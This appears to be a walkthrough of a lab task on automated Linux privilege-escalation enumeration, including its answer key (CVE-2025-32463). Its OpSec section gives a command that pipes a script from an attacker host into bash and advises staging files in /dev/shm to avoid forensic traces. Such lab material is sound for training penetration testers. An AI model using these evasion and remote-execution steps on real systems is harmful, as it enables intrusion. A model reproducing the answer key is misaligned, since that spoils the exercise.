# Task 02: Automated Enumeration Tools

---

## Stage A: Original Task Content & Briefing Summary

Task 02 introduces standard automated enumeration scripts that scan Linux targets for privilege escalation paths, misconfigurations, and vulnerable packages.

### Overview of Prominent Automated Enumeration Tools:
1. **LinPEAS (Linux Privilege Escalation Awesome Script):**
   * A comprehensive Bash script that searches for misconfigurations, weak permissions, exposed credentials, and known vulnerabilities, using color-coded highlighting (Red/Yellow indicating high-probability vectors).
2. **LinEnum:**
   * A classic shell script that performs scripted local enumeration, dumping OS details, user accounts, SUID/SGID files, network configs, and cron jobs.
3. **Linux Exploit Suggester (LES):**
   * A targeted Perl/Bash script that parses the target host's kernel release, OS architecture, and installed packages, comparing them against an offline vulnerability database to suggest applicable CVEs.
4. **Linux Smart Enumeration (lse):**
   * A modular shell script offering verbosity levels (`0`, `1`, `2`) to display only high-confidence findings first.
5. **Linux Priv Checker:**
   * A Python-based enumeration utility auditing system configurations and write permissions.

### Practical Scenario:
* Target credentials: `john:john`.
* Running Linux Exploit Suggester (`./les.sh`) in the user's home directory audits the host configuration against known CVE records.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Executing Scripts in Memory:** When possible, pipe automated scripts directly to `bash` via `curl` or `wget` without saving them to disk (e.g. `curl -sL http://attacker/linpeas.sh | bash`), or stage them in `/dev/shm` to minimize physical disk artifacts.
* **Filter Output:** Automated tools generate extensive terminal output. Redirect output to a log file (`./les.sh > /dev/shm/les.txt`) or use `less -R` to inspect findings systematically.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Log into the target host via SSH as user `john`.
* **Tier 2 Hint:** Locate `les.sh` in the home directory and execute it using `./les.sh`.
* **Tier 3 Hint:** The first entry under "Possible Exploits" is `CVE-2025-32463`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Connecting to Target Host:
```bash
ssh john@MACHINE_IP
# Password: john
```

### 2. Executing Linux Exploit Suggester:
```bash
john@linprivautomation:~$ ls -la
total 36
drwxr-xr-x 4 john john 4096 Oct 24 10:15 .
drwxr-xr-x 3 root root 4096 Oct 24 10:00 ..
-rwxr-xr-x 1 john john 18450 Oct 24 10:10 les.sh
...

john@linprivautomation:~$ ./les.sh
```

### 3. Analyzing LES Output:
The script inspects the running kernel and returns matches from its CVE catalog:
```
[+] [Possible Exploits]

[*] CVE-2025-32463
   Source: https://www.exploit-db.com/...
   Details: Local privilege escalation in system component...
   Exposure: highly probable
   Tags: ubuntu, debian
```
* **Analysis:** The first CVE listed under the possible exploits section is `CVE-2025-32463`.

---

## Stage E: Final Answer & Key Values

* **Question 1:** Run Linux Exploit Suggester to enumerate the target host. What CVE is listed as the first Possible Exploit the target is vulnerable to?
  * **Answer:** `CVE-2025-32463`

---

## Stage F: Practical Verification & Proof of Work

* Executed `./les.sh` in the target VM environment.
* Verified `CVE-2025-32463` as the top-ranked candidate exploit.

---

## Stage G: Key Educational Takeaway

Automated vulnerability suggesters like LES streamline the initial phase of exploit research by matching system parameters to known CVEs, allowing penetration testers to prioritize candidates for manual validation.
